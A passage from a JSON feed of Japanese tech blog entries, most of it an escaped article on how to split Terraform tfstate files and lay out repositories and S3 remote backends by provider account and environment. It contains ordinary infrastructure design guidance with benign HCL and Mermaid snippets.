Kubernetes」というタイトルで発表しました。発表の後で Kubernetes の upstream のキャッチアップ方法について質問を受けました。その場で回答はしたのですが、ちょうど社内の共有会で似たような話をしたところだったので、加筆修正したものを公開しておきます。 はじめにKubernetes の upstream を追いかけ始めて 1 年ちょっと経ったので、その経験をまとめます。Kubernetes の upstream やエコシステムを観察しているだけで、コントリビュータではありま...","isoDate":"2023-07-20T10:18:32.000Z","dateMiliSeconds":1689848312000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"メールが届いたら Google Home で音声で通知する","link":"https://blog.1q77.com/2023/07/ses-lambda-and-cloud-pubsub/","contentSnippet":"以前、「LINE に送ったメッセージを Google Home に読み上げさせる」という記事を書きました。その時に作ったものに家にあるラズパイで Cloud PubSub を subscribe してメッセージが届いたらその内容を Text-to-Speach で音声化して Google Home で再生する仕組みが存在します。","isoDate":"2023-07-10T14:25:35.000Z","dateMiliSeconds":1688999135000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"コンテナセキュリティ","link":"https://speakerdeck.com/kyohmizu/kontenasekiyuritei","contentSnippet":"「コンテナセキュリティ - Forkwell Library#26」の資料です。\\rhttps://forkwell.connpass.com/event/287259/","isoDate":"2023-07-05T04:00:00.000Z","dateMiliSeconds":1688529600000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"【Terraform\uD83E\uDDD1\uD83C\uDFFB‍\uD83D\uDE80】tfstateファイルの分割パターンとディレクトリ構成への適用","link":"https://hiroki-hasegawa.hatenablog.jp/entry/2023/07/05/001756","contentSnippet":"この記事から得られる知識この記事から得られる知識01. はじめに02. なぜ tfstate ファイルを分割するのか分割しなかった場合分割した方がいい場合分割しない方がいい場合03. tfstate ファイルの分割分割の境界状態の依存関係図依存関係図とは依存関係の表現▼ 依存関係の表現記法▼ 依存関係がない場合▼ 依存関係がある場合04. tfstate ファイルに基づくその他の設計リポジトリ \uD83D\uDC31 の設計リポジトリ分割ディレクトリ \uD83D\uDCC2 構成リモートバックエンド \uD83E\uDEA3 の設計リモートバックエンド分割ディレクトリ構成05. 状態の依存関係の定義方法terraform_remote_stateブロックの場合terraform_remote_stateブロックによる依存状態の依存関係図リポジトリのディレクトリ構成リモートバックエンドのディレクトリ構成AWSリソース別dataブロックの場合AWSリソース別dataブロックによる依存状態の依存関係図リポジトリのディレクトリ構成リモートバックエンドのディレクトリ構成06. tfstate ファイルの分割パターンオススメな設計の一覧大分類 (上層/下層/中間層) とディレクトリ構成の関係リポジトリの場合リモートバックエンドの場合07. 上層の分割 (推奨)上層の分割についてプロバイダーのアカウント別 - ★★★この分割方法について【プロバイダーアカウント別】状態の依存関係図【プロバイダーアカウント別】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合▼ 同じリポジトリの場合【プロバイダーアカウント別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合▼ 同じリモートバックエンドの場合08. 下層の分割 (推奨)下層の分割について実行環境別 - ★★★この分割方法について【実行環境別】状態の依存関係図【実行環境別】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合▼ 同じリポジトリの場合【実行環境別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合▼ 同じリモートバックエンド x AWSアカウント別に異なる実行環境 の場合▼ 同じリモートバックエンド x 単一のAWSアカウント内に全ての実行環境 の場合09. 中間層の分割 (任意)中間層の分割について運用チーム責務範囲別 - ★★この分割方法について【チーム別】状態の依存関係図【チーム別】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合▼ 同じリポジトリの場合【チーム別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合▼ 同じリモートバックエンドの場合プロダクトのサブコンポーネント別 - ★★この分割方法について【サブコンポーネント別】状態の依存関係図【サブコンポーネント別】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合▼ 同じリポジトリの場合【サブコンポーネント別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合▼ 同じリモートバックエンドの場合運用チーム責務範囲別 \xd7 プロダクトサブコンポーネント別 - ★この分割方法について【チーム別 \xd7 サブコンポーネント別】状態の依存関係図【チーム別 \xd7 サブコンポーネント別】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合▼ 同じリポジトリの場合【チーム別 \xd7 サブコンポーネント別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合▼ 同じリモートバックエンドの場合同じテナント内のプロダクト別この分割方法について【同じテナント内のプロダクト】状態の依存関係図【同じテナント内のプロダクト】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合▼ 同じリポジトリの場合【同じテナント内のプロダクト】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合▼ 同じリモートバックエンドの場合AWSリソースの種類グループ別この分割方法について【種類グループ別】状態の依存関係図【種類グループ別】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合▼ 同じリポジトリの場合【種類グループ別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合▼ 同じリモートバックエンドの場合AWSリソースの状態の変更頻度グループ別この分割方法について【変更頻度グループ別】状態の依存関係図【変更頻度グループ別】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合▼ 同じリポジトリの場合【変更頻度グループ別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合▼ 同じリモートバックエンドの場合10. おわりに謝辞記事関連のおすすめ書籍この記事を読むと、以下を \\"完全に理解\\" できます✌️Terraformのtfstateファイルを分割する目的と、オススメの分割パターンについて (★で表現)Terraformのリポジトリやリモートバックエンドのディレクトリ構成の設計について記事のざっくりした内容は、以下のスライドからキャッチアップできちゃいます！01. はじめにどうも、Mitchell Hashimoto です。さて最近の業務で、全プロダクトの技術基盤開発チームに携わっており、チームが使っているTerraform\uD83E\uDDD1\uD83C\uDFFB‍\uD83D\uDE80のリポジトリをリプレイスする作業を担当しました。このリポジトリでは単一のtfstateファイルが状態を持ち過ぎている課題を抱えていたため、課題に合った適切な分割パターンでリプレイスしました。今回は、この時に整理した分割パターン (AWS向け) を記事で解説しました。もちろん、GoogleCloudやAzureでも読み換えていただければ、同じように適用できます。知る限りの分割パターンを記載したところ、情報量がエグいことになってしまったため、気になる分割パターンだけ拾って帰っていただけるとハッピーです\uD83D\uDE4Fそれでは、もりもり布教していきます\uD83D\uDE1702. なぜ tfstate ファイルを分割するのか%%{init: { \'theme\': \\"default\\", \'themeVariables\': { \'commitLabelFontSize\': \'13px\' }}}%%gitGraph   commit id: \\"8c8e6\\"   commit id: \\"0e3c3\\"     branch feature/foo     checkout feature/foo     commit id: \\"4e9e8\\"     commit id: \\"da005\\"   checkout main     branch feature/bar     commit id: \\"2d52f\\"   checkout main   commit id: \\"e74d6\\"     branch feature/baz     commit id: \\"f6881\\"分割しなかった場合そもそも、なぜtfstateファイルを分割する必要があるのでしょうか。tfstateファイルを分割しなかったと仮定します。様々なインフラコンポーネントを単一のtfstateファイルで状態を持つ場合、1回のterraformコマンド全てのコンポーネントの状態を操作できて楽です。ただし、複数の作業ブランチがある状況だと煩わしいことが起こります。各作業ブランチでインフラコンポーネントの状態を変更しかけていると、他の作業ブランチから影響を受け、terraformコマンドでtargetオプションが必要になってしまいます。他にも、terraformコマンドの完了に時間がかかりすぎるといった問題も起こるかもしれません。単一のtfstateファイルで管理するコンポーネントが多くなるほど、これらの問題は顕著になります。分割した方がいい場合その一方で、tfstateファイルをいい感じに分割したと仮定します。各作業ブランチでは、まるで暗黙的にtargetオプションがついたように、他の作業ブランチから影響を受けずにterraformコマンドを実行できます。よって、各tfstateファイルを操作できる管理者は互いに影響を受けずに、terraformコマンドの結果を得られるようになります。Terraform: Up & Running; Writing Infrastructure As CodeOrganizing With Multiple States - DevOps with Terraform - CloudCasts分割しない方がいい場合運用ルールや開発者人数が理由で作業が衝突せず、targetオプションが必要ない状況であれば、tfstateファイルは分割しなくてもよいでしょう。tfstateファイルを分割するメリットが少ないです\uD83D\uDE45\uD83C\uDFFB‍03. tfstate ファイルの分割分割の境界それでは、tfstateファイルの分割の境界はどのようにして見つければよいのでしょうか。これを見つけるコツは、できるだけ相互に依存しないインフラリソースの関係 に注目することだと考えています。ここでいう依存とは、\\"tfstateファイルが他のtfstateファイルの状態を使用すること\\" です。もう少し具体的に言語化すると、\\"特定のインフラリソースが他の設定値を参照すること\\" です。状態をほとんど使用し合わない (互いに設定値の参照数が少ない) インフラリソース同士を、異なるtfstateファイルで管理します。異なるtfstateファイルで管理できる分割パターンについては後述します。▶ 『依存』という用語についてtfstateファイルでも同じ用語で表現することにしました。@tmknom さんが述べている通り、Terraformをよりよく設計するためには、『ソフトウェアの基礎知識』が必要です\uD83D\uDC4D状態の依存関係図依存関係図とは分割したtfstateファイル間の状態の依存関係を表現した図です。プロバイダーのアカウントの状態をtfstateファイルで管理していることを想像してみてください。%%{init:{\'theme\':\'default\'}}%%flowchart TB    subgraph AWSアカウント        foo[\\"tfstateファイル\\"]    end似たものとしてterraform graphコマンドによるグラフがありますが、これはインフラリソース間の依存関係図です。tfstateファイル間で相互に依存関係があるからといって、個別のインフラリソース間で循環参照が起こってしまうというわけではないです。続いて、依存関係がある場合と無い場合で、どのような依存関係図になるかを紹介していきます。terraform graph command reference | Terraform | HashiCorp Developer依存関係の表現▼ 依存関係の表現記法tfstateファイル間で状態の依存関係がある場合、これを図で表現すると分割の状況がわかりやすくなります。『依存』は、---\x3e (波線矢印) で表現することとします。依存関係がある場合については、後述します。▶ 『依存』の波線矢印について---\x3e (波線矢印) で表現します。そのため便宜上、tfstateファイルでも同じ記号で表現することにしました\uD83D\uDC4D▼ 依存関係がない場合例えば、AWSリソースからなるプロダクトをいくつかのtfstateファイル (foo-tfstate、bar-tfstate) に分割したと仮定します。ここで仮定した状況では、 tfstate ファイル間に依存関係はないとします。そのため、想定される状態の依存関係図は以下の通りになります。tfstateファイル間に依存関係がない状況がベストです。---title: tfstateファイル間に依存関係はない---%%{init:{\'theme\':\'default\'}}%%flowchart TB    subgraph AWSアカウント        foo[\\"foo-tfstate\\"]        bar[\\"bar-tfstate\\"]    end▼ 依存関係がある場合同様に分割したと仮定します。ここで仮定した状況では、 foo-tfstate ➡︎ bar-tfstate の方向に依存しているとします。そのため、---\x3e (波線矢印) を使用して、想定される状態の依存関係図は以下の通りになります。なお、依存方向は状況によって異なることをご容赦ください。---title: foo-tfstateファイルは、bar-tfstateファイルに依存---%%{init:{\'theme\':\'default\'}}%%flowchart TD    subgraph AWSアカウント        foo[\\"foo-tfstate\\"]        bar[\\"bar-tfstate\\"]    end    foo -. 依存 .-> bar04. tfstate ファイルに基づくその他の設計リポジトリ \uD83D\uDC31 の設計リポジトリ分割ここまでで、tfstateファイル分割について簡単に紹介しました。リポジトリの分割は、tfstateファイル分割に基づいて設計しましょう。可能であれば、1個のリポジトリに1個のtfstateファイルをおくことが望ましいです。異なるリポジトリにtfstateファイルをおいた方がよい場合については、分割パターン で説明しています。\uD83D\uDC31 foo-repository/├── backend.tf # fooコンポーネントの状態を持つ tfstate ファイルを指定する...\uD83D\uDC31 bar-repository/├── backend.tf # barコンポーネントの状態を持つ tfstate ファイルを指定する...ディレクトリ \uD83D\uDCC2 構成リポジトリ内のディレクトリ構成も、tfstateファイル分割に基づいて設計しましょう。率直に言うと、Terraformのディレクトリ構成のパターンは無数にあります。そのため、基準なしにディレクトリ構成を考えると何でもあり になってしまいます。その一方で、tfstateファイル分割に基づいて設計することにより、明確なディレクトリ構成パターン として抽出可能になります。\uD83D\uDC31 repository/├── \uD83D\uDCC2 foo/│    ├── backend.tf # fooコンポーネントの状態を持つ tfstate ファイルを指定する│    ...│└── \uD83D\uDCC2 bar/      ├── backend.tf # barコンポーネントの状態を持つ tfstate ファイルを指定する      ...▶ ローカルモジュールのディレクトリ構成の設計についてresource、data) のセットを使い回すことを目的とした、ローカルモジュールがあります。今回、これのディレクトリ構成は設計に含めていません。混同しやすいのですが、tfstateファイル分割に基づくディレクトリ構成とローカルモジュール内のそれは、全く別のテーマとして切り離して考えることができます\uD83D\uDC4Dリモートバックエンド \uD83E\uDEA3 の設計リモートバックエンド分割本記事では、リモートバックエンドとしてAWS S3バケットを使用することを想定しています。リモートバックエンドの分割は、tfstateファイル分割に基づいて設計しましょう。異なるリモートバックエンドにtfstateファイルをおいた方がよい場合については、分割パターン で説明しています。\uD83E\uDEA3 foo-bucket/│└── terraform.tfstate # fooコンポーネントの状態を持つ\uD83E\uDEA3 bar-bucket/│└── terraform.tfstate # barコンポーネントの状態を持つディレクトリ構成もし、リモートバックエンドをtfstateファイル分割に基づいて分割しなかったとします。その場合は、代わりにリモートバックエンド内のディレクトリ構成をtfstateファイル分割に基づいて設計しましょう。\uD83E\uDEA3 bucket/├── \uD83D\uDCC2 foo/│    └── terraform.tfstate # fooコンポーネントの状態を持つ│└── \uD83D\uDCC2 bar/      └── terraform.tfstate # barコンポーネントの状態を持つ05. 状態の依存関係の定義方法terraform_remote_stateブロックの場合terraform_remote_stateブロックによる依存terraform_remote_stateブロックには、以下のメリデメがあります。 アーキテクチャ特性  メリット ⭕️                                                                        デメリット \xd7                                                                                                                                                      可読性                 -                                                                                  terraform_remote_stateブロックに加えてoutputブロックも実装が必要であり、outputブロックは依存先のAWSリソースが一見してわかりにくい。                             拡張性                 依存先のAWSリソースに関わらず、同じterraform_remote_stateブロックを使い回せる。  -                                                                                                                                                                     保守性                 -                                                                                  依存先と依存元の間でTerraformのバージョンに差がありすぎると、tfstateファイル間で互換性がなくなり、terraform_remote_stateブロックの処理が失敗する。 本記事では、 terraform_remote_state ブロックを使用して、状態の依存関係を定義 していきます。tfstateファイルが他のtfstateファイルに依存する方法として、後述のAWSリソース別dataブロックがあります。The terraform_remote_state Data Source | Terraform | HashiCorp Developer状態の依存関係図例えば、AWSリソースからなるプロダクトをいくつかのtfstateファイル (foo-tfstate、bar-tfstate) に分割したと仮定します。ここで仮定した状況では、bar-tfstateファイルはVPCの状態を持っており、 foo-tfstate ファイルは bar-tfstate ファイルに依存しているとします。そのため、想定される状態の依存関係図は以下の通りになります。なお、依存方向は状況によって異なることをご容赦ください。---title: terraform_remote_stateブロックを使用した依存関係---%%{init:{\'theme\':\'default\'}}%%flowchart TD    subgraph bucket        foo[\\"foo-tfstate\\"]        bar[\\"bar-tfstate\\"]    end    foo -. VPCの状態に依存 .-> barリポジトリのディレクトリ構成tfstateファイル分割に基づいて、リポジトリのディレクトリ構成例は以下の通りになります。ディレクトリの設計方法は、分割パターン で説明しています。\uD83D\uDC31 repository/├── \uD83D\uDCC2 foo/│    ├── backend.tf # fooコンポーネントの状態を持つ tfstate ファイルを指定する│    ├── remote_state.tf # terraform_remote_stateブロックを使用し、bar-tfstate ファイルに依存する│    ├── provider.tf│    ...│└── \uD83D\uDCC2 bar/      ├── backend.tf # barコンポーネントの状態を持つ tfstate ファイルを指定する      ├── output.tf # 他の tfstate ファイルから依存される      ├── provider.tf      ...foo-tfstateファイルがbar-tfstateファイルに依存するために必要な実装は、以下の通りになります。resource \\"example\\" \\"foo\\" {  # fooリソースは、bar-tfstate ファイルのVPCに依存する  vpc_id = data.terraform_remote_state.bar.outputs.bar_vpc_id  ...}data \\"terraform_remote_state\\" \\"bar\\" { backend = \\"s3\\"  config = {    bucket = \\"tfstate\\"    key    = \\"bar/terraform.tfstate\\"    region = \\"ap-northeast-1\\"  }}# VPCの状態は、bar-tfstate ファイルで持つoutput \\"bar_vpc_id\\" {  value = aws_vpc.bar.id}resource \\"aws_vpc\\" \\"bar\\" {  ...}リモートバックエンドのディレクトリ構成tfstateファイル分割に基づいて、リモートバックエンド内のディレクトリ構成例は以下の通りになります。\uD83E\uDEA3 bucket/├── \uD83D\uDCC2 foo│    └── terraform.tfstate # fooコンポーネントの状態を持つ│└── \uD83D\uDCC2 bar      └── terraform.tfstate # barコンポーネントの状態を持つAWSリソース別dataブロックの場合AWSリソース別dataブロックによる依存AWSリソース別dataブロックには、以下のメリデメがあります。 アーキテクチャ特性  メリット ⭕️                                                                                                                                     デメリット \xd7                                                 可読性                 依存先のAWSリソースがわかりやすい。                                                                                                             -                                                                拡張性                 -                                                                                                                                               依存先のAWSリソース別dataブロックが必要である。                保守性                 依存先と依存元の間でTerraformのバージョンに差があっても、tfstateファイル間で直接的に依存するわけではないため、バージョン差の影響を受けない。  -                                                 今回は使用しませんが、依存関係の他の定義方法として、AWSリソース別dataブロックがあります。これは、tfstateファイルが自身以外 (例：コンソール画面、他のtfstateファイル) で作成されたAWSリソースの状態に依存するために使用できます。terraform_remote_stateブロックとは異なり、直接的にはtfstateファイルに依存しません。AWSリソース別dataブロックの場合は、実際のAWSリソースの状態に依存することにより、間接的にAWSリソースのtfstateファイルに依存することになります。Query data from external sources | Terraform | HashiCorp Developer状態の依存関係図例えば、AWSリソース別dataブロックも同様にして、AWSリソースからなるプロダクトをいくつかのtfstateファイル (foo-tfstate、bar-tfstate) に分割したと仮定します。ここで仮定した状況では、bar-tfstateファイルはVPCの状態を持っており、 foo-tfstate ファイルは bar-tfstate ファイルに依存しているとします。想定される状態の依存関係図は以下の通りになります。なお、依存方向は状況によって異なることをご容赦ください。---title: dataブロックを使用した依存関係---%%{init:{\'theme\':\'default\'}}%%flowchart TD    subgraph bucket        foo[\\"foo-tfstate\\"]        bar[\\"bar-tfstate\\"]    end    foo -. VPCの状態に依存 .-> barリポジトリのディレクトリ構成ディレクトリ構成は、tfstateファイル分割に基づいて、以下の通りになります。\uD83D\uDC31 repository/├── \uD83D\uDCC2 foo/│    ├── backend.tf # fooコンポーネントの状態を持つ tfstate ファイルを指定する│    ├── data.tf # dataブロックを使用し、bar-tfstate ファイルに依存する│    ├── provider.tf│    ...│└── \uD83D\uDCC2 bar/      ├── backend.tf # barコンポーネントの状態を持つ tfstate ファイルを指定する      ├── provider.tf      ...foo-tfstateファイルがbar-tfstateファイルに依存するために必要な実装は、以下の通りになります。# fooリソースの状態は、foo-tfstate ファイルで持つresource \\"example\\" \\"foo\\" {  # fooリソースは、bar-tfstate ファイルのVPCに依存する  vpc_id     = data.aws_vpc.bar.id}# VPCの状態は、bar-tfstate ファイルで持つdata \\"aws_vpc\\" \\"bar\\" {  filter {    name   = \\"tag:Name\\"    values = [\\"<bar-tfstateが持つVPCの名前>\\"]  }}リモートバックエンドのディレクトリ構成tfstateファイル分割に基づいて、リモートバックエンド内のディレクトリ構成例は以下の通りになります。\uD83E\uDEA3 bucket/├── \uD83D\uDCC2 foo│    └── terraform.tfstate # fooコンポーネントの状態を持つ│└── \uD83D\uDCC2 bar      └── terraform.tfstate # barコンポーネントの状態を持つ06. tfstate ファイルの分割パターンオススメな設計の一覧前述の通り、tfstateファイルの分割の境界は、『他の状態にできるだけ依存しないリソースの関係』から見つけることができます。分割しすぎると terraform_remote_stateブロック地獄 になるため、細かすぎず粗すぎない適切な境界を見つけていきましょう。今回は、私が考える分割パターンをいくつか紹介します。全てが実用的なパターンというわけでないため、オススメするものを ★ としています。推奨・任意    tfstate分割パターン大分類    tfstate分割パターン小分類オススメ    対応するリポジトリ構成 \uD83D\uDC31    対応するリモートバックエンド構成 \uD83E\uDEA3  推奨    上層    プロバイダーのアカウント別    ★★★    リポジトリ自体または上層ディレクトリ    リモートバックエンド自体または上層ディレクトリ  下層実行環境別    ★★★    下層ディレクトリ    下層ディレクトリ  任意    中間層    運用チーム責務範囲別    ★★    中間層ディレクトリ    中間層ディレクトリ  プロダクトのサブコンポーネント別    ★★  運用チーム責務範囲別\xd7プロダクトのサブコンポーネント別(組み合わせ)    ★  同じテナント内のプロダクト別      AWSリソースの種類グループ別      AWSリソースの状態の変更頻度グループ別      大分類 (上層/下層/中間層) とディレクトリ構成の関係リポジトリの場合記事内のここ で、リポジトリ内のディレクトリ構成はtfstateファイル分割に基づいて設計するべき、という説明をしました。tfstateファイルの分割パターンは、上層/下層/中間層 の層に大別できます。これらの層は、以下の通りリポジトリ自体・ディレクトリ構成の設計方法に影響します。# リポジトリ自体を分割する場合\uD83D\uDC31 上層/├── \uD83D\uDCC2 中間層/│    ├── \uD83D\uDCC2 下層/│    │    ├── backend.tfvars # 分割された tfstate ファイルを指定する│    │    ...│    │...# リポジトリ内のディレクトリを分割する場合\uD83D\uDC31 リポジトリ/├── \uD83D\uDCC2 上層/│    ├── \uD83D\uDCC2 中間層/│    │    ├── \uD83D\uDCC2 下層/│    │    │    ├── backend.tfvars # 分割された tfstate ファイルを指定する│    │    │    ...│    │    │...リモートバックエンドの場合記事内のここ で、リモートバックエンドのディレクトリ構成についても言及しました。これらの層は、以下の通りリモートバックエンド自体・ディレクトリ構成の設計方法に影響します。# リモートバックエンド自体を分割する場合\uD83E\uDEA3 上層/├── \uD83D\uDCC2 中間層/│    ├── \uD83D\uDCC2 下層/│    │    └── terraform.tfstate # 分割された状態を持つ│    ││    │...# リモートバックエンド内のディレクトリを分割する場合\uD83E\uDEA3 bucket/├── \uD83D\uDCC2 上層/│    ├── \uD83D\uDCC2 中間層/│    │    ├── \uD83D\uDCC2 下層/│    │    │    └── terraform.tfstate # 分割された状態を持つ│    │    ││    │    │...07. 上層の分割 (推奨)上層の分割について上層の分割は 推奨 です。Terraformに携わる管理者の数が少なくても採用した方がよいです。tfstateファイルをパターンに応じて分割し、これに基づいてディレクトリ・リモートバックエンドも設計しましょう。プロバイダーのアカウント別 - ★★★この分割方法について上層分割の中でも、基本的な方法の1つです。プロバイダーのアカウント別にtfstateファイルを分割し、上層もこれに基づいて設計します。この分割方法により、各プロバイダーの管理者が互いに影響を受けずに、terraformコマンドの結果を得られるようになります。▶ おすすめ度についてtfstateファイルで状態を管理せざるを得ない場合があります。例えば、Kubernetesのプロバイダーは、EKSと同じtfstateファイルで管理した方がよいです\uD83D\uDC4DTerraform Registry【プロバイダーアカウント別】状態の依存関係図例えば、以下のプロバイダーを使用したい状況と仮定します。主要プロバイダー (AWS)アプリ/インフラ監視プロバイダー (Datadog)ジョブ監視プロバイダー (Healthchecks)インシデント管理プロバイダー (PagerDuty)ここで仮定した状況では、各プロバイダーの tfstate ファイル間で状態が相互に依存しているとします。AWSリソース間の相互依存ではないため、循環参照は起こりません。そのため、想定される状態の依存関係図は以下の通りになります。なお、依存方向は状況によって異なることをご容赦ください。---title: プロバイダーのアカウント別---%%{init:{\'theme\':\'default\'}}%%flowchart LR    subgraph PagerDuty        pagerDuty[\\"tfstate\\"]    end    subgraph Healthchecks        healthchecks[\\"tfstate\\"]    end    subgraph Datadog        datadog[\\"tfstate\\"]    end    subgraph AWS        aws[\\"tfstate\\"]    end    aws -...-> datadog    aws -...-> healthchecks    aws -...-> pagerDuty    datadog -...-> aws    healthchecks -...-> aws    pagerDuty -...-> aws【プロバイダーアカウント別】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合プロバイダーアカウント別に分割したtfstateファイルを、異なるリポジトリで管理します。例えば、tfstateファイル分割に基づいて、リポジトリのディレクトリ構成例は以下の通りになります。前述の依存関係図の状況と仮定します。\uD83D\uDC31 aws-repository/├── backend.tf # AWSの状態を持つ tfstate ファイルを指定する├── output.tf # 他の tfstate ファイルから依存される├── remote_state.tf # terraform_remote_state ブロックを使用する├── provider.tf...\uD83D\uDC31 datadog-repository/├── backend.tf # Datadogの状態を持つ tfstate ファイルを指定する├── output.tf # 他の tfstate ファイルから依存される├── remote_state.tf # terraform_remote_state ブロックを使用する├── provider.tf...\uD83D\uDC31 healthchecks-repository/├── backend.tf # Healthchecksの状態を持つ tfstate ファイルを指定する├── output.tf # 他の tfstate ファイルから依存される├── remote_state.tf # terraform_remote_state ブロックを使用する├── provider.tf...\uD83D\uDC31 pagerduty-repository/├── backend.tf # PagerDutyの状態を持つ tfstate ファイルを指定する├── output.tf # 他の tfstate ファイルから依存される├── remote_state.tf # terraform_remote_state ブロックを使用する├── provider.tf...▼ 同じリポジトリの場合プロバイダーアカウント別に分割したtfstateファイルを、同じリポジトリで管理します。例えば、tfstateファイル分割に基づいて、リポジトリのディレクトリ構成例は以下の通りになります。前述の依存関係図の状況と仮定します。\uD83D\uDC31 repository/├── \uD83D\uDCC2 aws/│    ├── backend.tf # AWSの状態を持つ tfstate ファイルを指定する│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── provider.tf│    ...│├── \uD83D\uDCC2 datadog/│    ├── backend.tf # Datadogの状態を持つ tfstate ファイルを指定する│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── provider.tf│    ...│├── \uD83D\uDCC2 healthchecks/│    ├── backend.tf # Healthchecksの状態を持つ tfstate ファイルを指定する│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── provider.tf│    ...│└── \uD83D\uDCC2 pagerduty/      ├── backend.tf # PagerDutyの状態を持つ tfstate ファイルを指定する      ├── output.tf # 他の tfstate ファイルから依存される      ├── remote_state.tf # terraform_remote_state ブロックを使用する      ├── provider.tf      ...【プロバイダーアカウント別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合プロバイダーアカウント別に分割したtfstateファイルを、異なるリモートバックエンドで管理します。例えば、tfstateファイル分割に基づいて、リモートバックエンド内のディレクトリ構成例は以下の通りになります。前述の依存関係図の状況と仮定します。\uD83E\uDEA3 aws-bucket/│└── terraform.tfstate # AWSの状態を持つ\uD83E\uDEA3 datadog-bucket/│└── terraform.tfstate # Datadogの状態を持つ\uD83E\uDEA3 healthchecks-bucket/│└── terraform.tfstate # Healthchecksの状態を持つ\uD83E\uDEA3 pagerduty-bucket/│└── terraform.tfstate # PagerDutyの状態を持つ▼ 同じリモートバックエンドの場合プロバイダーアカウント別に分割したtfstateファイルを、同じリモートバックエンドで管理します。例えば、tfstateファイル分割に基づいて、リモートバックエンド内のディレクトリ構成例は以下の通りになります。前述の依存関係図の状況と仮定します。\uD83E\uDEA3 bucket/├── \uD83D\uDCC2 aws│    └── terraform.tfstate # AWSの状態を持つ│├── \uD83D\uDCC2 datadog│    └── terraform.tfstate # Datadogの状態を持つ│├── \uD83D\uDCC2 healthchecks│    └── terraform.tfstate # Healthchecksの状態を持つ│└── \uD83D\uDCC2 pagerduty      └── terraform.tfstate # PagerDutyの状態を持つ08. 下層の分割 (推奨)下層の分割について下層の分割は 推奨 です。Terraformに携わる管理者の数が少なくても採用した方がよいです。tfstateファイルをパターンに応じて分割し、これに基づいてディレクトリ・リモートバックエンドも設計しましょう。実行環境別 - ★★★この分割方法について下層分割の中でも、基本的な方法の1つです。実行環境別にtfstateファイルを分割し、下層もこれに基づいて設計します。この分割方法により、各実行環境の管理者が互いに影響を受けずに、terraformコマンドの結果を得られるようになります。Terraform: Up & Running; Writing Infrastructure As CodeGruntwork Blog | How to manage Terraform state▶ おすすめ度について【実行環境別】状態の依存関係図例えば、以下の実行環境を構築したい状況と仮定します。Tes環境 (検証環境)Stg環境 (ユーザー受け入れ環境)Prd環境 (本番環境)かつ、以下のプロバイダーを使用したい状況と仮定します。主要プロバイダー (AWS)アプリ/インフラ監視プロバイダー (Datadog)ジョブ監視プロバイダー (Healthchecks)インシデント管理プロバイダー (PagerDuty)ここで仮定した状況では、各実行環境の tfstate ファイルは他の実行環境には依存していないとします。そのため、想定される状態の依存関係図は以下の通りになります。なお、依存方向は状況によって異なることをご容赦ください。---title: 実行環境別---%%{init:{\'theme\':\'default\'}}%%flowchart LR    subgraph PagerDuty        pagerDuty[\\"tfstate\\"]    end    subgraph Healthchecks        healthchecks[\\"tfstate\\"]    end    subgraph Datadog        datadog[\\"tfstate\\"]    end    subgraph AWS        subgraph tes-bucket            tes[\\"tfstate\\"]        end        subgraph stg-bucket            stg[\\"tfstate\\"]        end        subgraph prd-bucket            prd[\\"tfstate\\"]        end    end    tes -...-> datadog    tes -...-> healthchecks    tes -...-> pagerDuty    datadog -...-> tes    healthchecks -...-> tes    pagerDuty -...-> tes【実行環境別】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合プロバイダーアカウント別にtfstateファイルを分割することは推奨としているため、その上でディレクトリ構成を考えます。例えば、tfstateファイル分割に基づいて、リポジトリのディレクトリ構成例は以下の通りになります。前述の依存関係図の状況と仮定します。\uD83D\uDC31 aws-repository/├── output.tf # 他の tfstate ファイルから依存される├── remote_state.tf # terraform_remote_state ブロックを使用する├── provider.tf├── \uD83D\uDCC2 tes/ # Tes環境│    ├── backend.tfvars # Tes環境のAWSリソースの状態を持つ tfstate ファイルを指定する│    ...│├── \uD83D\uDCC2 stg/ # Stg環境└── \uD83D\uDCC2 prd/ # Prd環境\uD83D\uDC31 datadog-repository/├── output.tf # 他の tfstate ファイルから依存される├── remote_state.tf # terraform_remote_state ブロックを使用する├── provider.tf├── \uD83D\uDCC2 tes/│    ├── backend.tfvars # Tes環境のDatadogの状態を持つ tfstate ファイルを指定する│    ...│├── \uD83D\uDCC2 stg/└── \uD83D\uDCC2 prd/\uD83D\uDC31 healthchecks-repository/├── output.tf # 他の tfstate ファイルから依存される├── remote_state.tf # terraform_remote_state ブロックを使用する├── provider.tf├── \uD83D\uDCC2 tes/│    ├── backend.tfvars # HealthchecsのTes環境の状態を持つ tfstate ファイルを指定する│    ...│├── \uD83D\uDCC2 stg/└── \uD83D\uDCC2 prd/\uD83D\uDC31 pagerduty-repository/├── output.tf # 他の tfstate ファイルから依存される├── remote_state.tf # terraform_remote_state ブロックを使用する├── provider.tf├── \uD83D\uDCC2 tes/│    ├── backend.tfvars # Tes環境のPagerDutyの状態を持つ tfstate ファイルを指定する│    ...│├── \uD83D\uDCC2 stg/└── \uD83D\uDCC2 prd/▼ 